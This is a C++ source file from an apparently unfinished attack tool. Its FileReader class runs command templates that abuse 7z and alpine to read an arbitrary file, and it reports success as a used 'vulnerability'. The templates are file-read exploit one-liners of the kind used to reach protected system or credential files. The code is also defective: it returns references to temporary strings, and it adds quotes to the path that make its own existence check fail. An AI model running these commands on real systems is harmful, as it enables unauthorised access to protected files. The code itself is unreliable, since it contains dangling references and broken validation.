//
// Created by moshe on 16/10/2023.
//

using namespace std;

#include <iostream>
#include <string>
#include <filesystem>

#include "../../Header/Exploits/FileReader.h"
#include "../../../Logger/Header/Logger.h"


FileReader::FileReader(ShellCommander& shellCommander) : _shellCommander(shellCommander)
{
    //TODO: Read the commands from the DB or other config file
    //TODO: Load all the commands from the web
    _templateCommands[0] = "LFILE={0}\n7z a -ttar -an -so $LFILE | 7z e -ttar -si -so";
    _templateCommands[1] = "LFILE={0}\nalpine -F \"$LFILE\"";
}

bool FileReader::isFileExists(const char* filePath)
{
    //TODO: Check that the
    // 1) filePath variable contains only a path and doesn't contain anything else (like commands, flags, args etc.)
    // 2) filePath content surround with the char Apostrophes (")
    // 3) The path is absolut path and no relative because the relative influenced by the software running folder place
    //
    //TODO: Add try catch in all functions!

    ifstream actualFilesystem(filePath);
    filesystem::path path(filePath);

    if(!actualFilesystem){
        logger->Error("The given path is not an exist file path");
        return false;
    }

    if(!path.is_absolute()){
        logger->Error("The given path is not an absolute file path");
        return false;
    }

    if(filesystem::is_directory(filePath)) {
        logger->Error("The given path is a folder path but needed FILE path");
        return false;
    }

    return true;
}

std::string surroundWithQuotes(const std::string& input) {
    std::string result = input;

    // Check if the string starts with a double quote
    if (!result.empty() && result.front() != '\"') {
        result = "\"" + result;
    }

    // Check if the string ends with a double quote
    if (!result.empty() && result.back() != '\"') {
        result = result + "\"";
    }

    return result;
}

int FileReader::getFilePath(string& filePathStr) {

    cout << "Please enter the valid file path that you want to read: " << endl;
    getline(std::cin, filePathStr);

    //Add quotes in order to prevent unexpected behavior
    //and to handle malicious command in the file path
    string filePathWithQuotes = surroundWithQuotes(filePathStr);

    const char* filePath = filePathWithQuotes.c_str();

    //Validate that the filePath pointer is not null, and it's point to the existing READABLE file
    if(!isFileExists(filePath)) {
        logger->Error("The given path is not a valid file path.\nThe given path is: " + filePathWithQuotes);
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

const string& FileReader::createFailedCommandMsg(const char *fullCommand, const RunningResult& runingResult) {
    ostringstream failedCommandMsg;
    failedCommandMsg << "Try the command:\n" << fullCommand << "\nThe command failed with exit code " <<
                     to_string(runingResult.ExitCode) << ".\n The verbose is: " << runingResult.Verbose;
    if(!runingResult.AdditionalInfo.empty()){
        failedCommandMsg << ".\nThe additional info is: " << runingResult.AdditionalInfo;
    }

    return failedCommandMsg.str();
}

const string& FileReader::createSuccessCommandMsg(const char *fullCommand, const RunningResult& runingResult) {
    ostringstream successCommandMsg;
    successCommandMsg << "Congratulations! we managed to use one of the vulnerabilities.\n" <<
                      "The command is: " << fullCommand << ".\n The verbose is: " << runingResult.Verbose;
    if(!runingResult.AdditionalInfo.empty()){
        successCommandMsg << ".\nThe additional info is: " << runingResult.AdditionalInfo;
    }

    return successCommandMsg.str();
}

// Left const for the value in the location of the pointer. The right const protects the pointer-location itself
int FileReader::run(size_t argc, const string& argv[])
{
    string filePathStr;
    int exitCode = getFilePath(filePathStr);
    while(exitCode != EXIT_SUCCESS){
        cout << "File path that you entered is NOT a valid file path!";
        exitCode = getFilePath(filePathStr);
    }

    const char* filePath = filePathStr.c_str();

    for(const string& _templateCommand : _templateCommands){

        char* fullCommand = nullptr;
        try{
            fullCommand = fillCmdTemplate(filePath, _templateCommand);
        }catch (exception& e) {
            logger->Error(e.what());
            continue;
        }

        // Print the modified string
        ostringstream startRunningMsg;
        startRunningMsg << "The fullCommand with file path is:\n" << fullCommand;

        logger->Info(startRunningMsg.str());

        //TODO: add try catch here. because this function throws a string
        //TODO: If you write the output to the stream, then in the case of searching for more vulnerabilities,
        //      you have to change the stream for each and every vulnerability
        RunningResult runningResult = _shellCommander.run(fullCommand);
        if(runningResult.ExitCode != 0){
            string failedCommandMsg = createFailedCommandMsg(fullCommand, runningResult);

            logger->Error(failedCommandMsg);

            continue;
        }

        string successCommandMsg = createSuccessCommandMsg(fullCommand, runningResult);

        cout << successCommandMsg << endl;
        logger->Info(successCommandMsg);

        cout << "Choose one of the following options:\n" <<
                "1) Continue to find another useful vulnerability." <<
                "2) Stop the scan here." <<
                "3) Continue to find all the vulnerabilities you can" << endl;

        char choose;
        cin >> choose;
        while(choose != '1' && choose != '2' && choose != '3'){
            cout << "Please enter a number in the range 1-3" << endl;
            cin >> choose;
        }

        if(choose == '1'){
            cout << "Continue running to find another vulnerability for this aim" << endl;
        }else if (choose == '2'){
            return EXIT_SUCCESS;
        }else if (choose == '3'){

        }

        //TODO: Reorder the code structure

        // Clean up dynamically allocated memory
        delete[] fullCommand;
    }

    return EXIT_SUCCESS;
}